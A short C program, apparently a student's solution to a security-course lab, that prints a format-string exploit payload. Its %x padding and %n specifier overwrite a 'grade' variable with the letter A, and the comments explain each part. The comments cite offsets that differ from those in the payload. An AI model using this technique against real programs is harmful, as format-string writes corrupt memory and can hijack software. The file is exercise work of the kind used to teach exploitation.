// Wright Kim
// wdk7bj

#include <stdio.h>
#include <string.h>

int main(){
	int i;
	//address of the grade, total 4 bytes
//	unsigned char addr[] = {0x3c, 0xf0, 0xff, 0xbf};
	/*
	%61x: need 61bytes to make 65 bytes 65 decimal is "A"
	%19: the buffer is at 19th word of the stack (from the first pop up)
	$n: writes 65 at the address of 'grade'
	\nWright Kim: need to write name on the new line
	last A: need something here, otherwise, m of Kim will not print
	*/
	unsigned char pad[] = {"%x%x%49d%3$n\nWright KimA"};

//	for(i = 0; i < sizeof(addr); i++){
//		putchar(addr[i]);
//	}

	for(i = 0; i < sizeof(pad); i++){
		putchar(pad[i]);
	}

	return 0;
}
